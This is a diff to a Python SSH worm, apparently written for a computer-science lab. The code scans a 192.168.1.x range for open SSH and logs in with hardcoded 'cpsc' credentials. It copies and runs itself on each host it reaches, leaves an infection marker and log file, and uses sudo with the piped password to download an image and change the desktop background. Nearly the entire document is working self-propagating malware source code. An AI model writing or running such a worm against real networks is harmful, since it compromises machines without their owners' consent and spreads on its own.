@@ -5,28 +5,36 @@ import sys, time
 import datetime
 import paramiko
 
-# By default, target SSH
+# Target SSH by default
 target_port = 22
 
-
+# New desktop background url + file name
 image_url = "https://i.imgur.com/hbNtlcJ.jpg"
 image_name = "hbNtlcJ.jpg"
-# Currently these 2 do nothing
-remote_username="cpsc"
-remote_password="cpsc"
+
+# Username and password to test with SSH
+remote_username = "cpsc"
+remote_password = "cpsc"
+
+# Handy variables
+home_dir = "/home/cpsc/"
 worm_name = "worm.py"
+
+# Output formatting
+offset = 4 * " "
+
+# Place in remote system to mark it as infected
 marker_file = "infected.txt"
+
 # Specifies what ip to stop at 192.168.1.0-max_ip. Saves time in testing
 max_ip = 10
+
+
 hosts = ["192.168.1." + str(i) for i in range(0, max_ip)]
 
 
-# Offset to help format output
-offset = 4 * " "
-
-
 def get_local_ip():
-	""" Gets the current machines ip, so we don't waste time scanning it """
+	""" Gets current machine's ip, so we don't waste time scanning it """
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	try:
 		sock.connect(('8.8.8.8', 1))
@@ -67,7 +75,6 @@ def get_vulnerable_hosts(port):
 	""" Returns a list of hosts with specified port open """
 	print ("[+] Scanning for vulnerable hosts...\n")
 	vulnerable_hosts = []
-
 	current_machine = get_local_ip()
 
 	for host in hosts:
@@ -92,28 +99,40 @@ def get_vulnerable_hosts(port):
 
 def set_background(ssh):
 	""" Downloads a new desktop background for remote system """
-	stdin, stdout, stderr = ssh.exec_command("ls /home/cpsc/")
+	
+	# Get the files in the user's home folder
+	stdin, stdout, stderr = ssh.exec_command("ls " + home_dir)
 
-	# For some reason, readlines() converts text to unicode, so I convert it back
-	l = stdout.readlines()
-	l = [str(name) for name in l]
-	l = [name[0:-1] for name in l]
-	if image_name not in l:
+	# readlines() convert output to unicode, so convert back to ascii
+	ls_output = stdout.readlines()
+	ls_output = [str(name) for name in ls_output]
+	ls_output = [name[0:-1] for name in ls_output]
+	# Check if the image name did not appear in ls output
+	if image_name not in ls_output:
 		print ("%s[o] Adding background..." % (offset))
-		ssh.exec_command("cd ~/ && wget " + image_url)
-		# Need to issue a blocking command so download can finish before we move on?
-		time.sleep(20)
+		# Download image to remote user's home directory
+		ssh.exec_command("cd " + home_dir)
+		ssh.exec_command("wget " + image_url)
 	else:
 		print ("%s[!] Background already there." % (offset))
-
-	"""
+	
+	# Now try setting the background
 	try:
-		cmd = "echo " + "'" + remote_password + "' | sudo -S gsettings set org.gnome.desktop.background picture-uri file:///home/cpsc/" + image_name
-		#print (cmd)
-		ssh.exec_command(cmd)
+		print (" Trying to set desktop background")
+		stdin, stdout, stderr = ssh.exec_command("export DISPLAY=:0")			
+		# No output from these
+		#print (stdout.readlines())
+		#print (stderr.readlines())
+		# Following command works when run manually on target machine, but not through ssh
+		prefix = "echo '" + remote_password + "' | sudo -S "
+		cmd = "gsettings set org.gnome.desktop.background picture-uri file:///$PWD/" + image_name
+		stdin, stdout, sterr = ssh.exec_command(prefix + cmd)
+		print (stdout.readlines())
+		print (stderr.readlines())
+		time.sleep(14)
 	except:
 		print("Error with setting gnome desktop background\n")
-	"""
+	
 
 if __name__ == "__main__":
 	""" Main program that performs the scan """
@@ -125,84 +144,84 @@ if __name__ == "__main__":
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	local_ip = get_local_ip()
-	for host in vulnerable_hosts:
+	for host in sorted(vulnerable_hosts):
 		print ("[+] Attempting to SSH into %s" % (host))
 
 		# Attempt to SSH into known host
 		try:
-			ssh.connect(host, username="cpsc", password="cpsc")
+			ssh.connect(host, username=remote_username, password=remote_password)
 		except Exception as e:
 			print ("%s[!] Bad credentials, skipping." % (offset))
+			ssh.close()
 			continue
 		except KeyboardInterrupt as e:
 			print ("%s[!] Skipping host\n" % (offset))
+			ssh.close()
 			continue
-
+		
 		# Try to put worm on remote system
 		try:
 			sftpClient = ssh.open_sftp()
 			print ("%s[o] Access Granted!" % (offset))
 			
-			try:
-				stdin, stdout, stderr = ssh.exec_command("ls /tmp/")
-				results = stdout.readlines()
-				results = [str(name) for name in results]
-				results = [name[0:-1] for name in results]
-				if marker_file in results:
-					print ("Marker found")
-					time = str(datetime.datetime.now()).replace(' ','-')
-					print ("debug1")
-					ssh.exec_command("echo '" + str(local_ip) + "' >> " + "/home/cpsc/log-" + time)
-					print ("debug2")
-					#record = open("/home/cpsc/log-" + time, "w")
-					#record.write(local_ip)
-					#record.close()
-					print ("%s[!] Sytem already infected, skipping." % (offset))
-					continue
-				else:
-					print ("%s[o] Marking system..." % (offset))
-					#ssh.exec_command("echo '1' >> /tmp/" + marker_file)
-					sftpClient.put(worm_name, "/tmp/" + worm_name)
+			# Check if the system has already been infected
+			stdin, stdout, stderr = ssh.exec_command("ls /tmp/")
+			# Convert stdout to ASCII from unicode
+			results = stdout.readlines()
+			results = [str(name) for name in results]
+			results = [name[0:-1] for name in results]
+			if marker_file in results:
+				print ("%s[!] System already infected, skipping." % (offset))
+				# Create log file to see which system infected it, remove this later
+				cur_time = str(datetime.datetime.now()).replace(' ','-')
+				ssh.exec_command("echo '" + str(local_ip) + "' >> " + home_dir + "loginf-" + cur_time)
+				set_background(ssh)
+				ssh.close()
+				continue
+			else: # Has not been infected
+				print ("%s[o] Marking system..." % (offset))
+				sftpClient.put(worm_name, "/tmp/" + worm_name)
+				ssh.exec_command("echo " + local_ip + " >> /tmp/" + marker_file)
 					
-			except Exception as e:
-				print ("Error with sftpClient.put")
-				pass
-		
-			# Try making worm file executable by all
-			try:
-				ssh.exec_command("chmod a+x /tmp" + worm_name)
-			except Exception as e: 
-				print ("%s [!]Error with chmod", (offset))
-		
-			# Try launching the worm from remote host
-			try:
-				ssh.exec_command("python /tmp/" + worm_name)
-			except Exception as e:
-				print("Error executing")
-				pass
-
-			except KeyboardInterrupt as e:
-				print ("%s[!] User stopped, moving to next IP\n" % (offset))
-				pass
-
-			#try:
-			#	set_background(ssh)
-			#except Exception as e:
-			#	print ("%s[!] Error setting desktop background\n" % (offset))
-			#	pass
-		
-			#ssh.close()
 		except Exception as e:
-			print ("%s[!] Could not SSH into %s\n" % (offset, host))
+			print ("%s[!] Error opening sftp connection. Skipping host " % (offset))
+			ssh.close()
+			continue
+		# Try making worm file executable by all
+		try:
+			ssh.exec_command("chmod a+x /tmp" + worm_name)
+		except Exception as e: 
+			print ("%s [!]Error with chmod. Skipping host", (offset))
+			ssh.close()
+			continue
+		# Try launching the worm from remote host
+		try:
+			ssh.exec_command("python /tmp/" + worm_name)
+			print ("%s[o] Executing worm from %s" % (offset, host))
+		except Exception as e:
+			print("%s[!] Error executing" % (offset))
+			ssh.close()
+			continue
+
+		except KeyboardInterrupt as e:
+			print ("%s[!] User stopped, moving to next IP\n" % (offset))
+			ssh.close()
+			continue
+
+		# Try changing the background on remote host
+		try:
+			set_background(ssh)
+		except Exception as e:
+			print ("%s[!] Error setting desktop background\n" % (offset))
 			pass
+		
 		except KeyboardInterrupt as e:
 			print ("%s[!] User stopped, quitting.\n" % (offset))
-			ssh.clos()
-			sys.exit(1)
-		finally:
-			set_background(ssh)
-			os.environ["DISPLAY"]=":0"
-			os.system("gsettings set org.gnome.desktop.background picture-uri file:///home/cpsc/hbNtlcJ.jpg")
 			ssh.close()
+			sys.exit(1)
+		
+
+		ssh.close()
+
 	print ("Finished attacking\n")
 
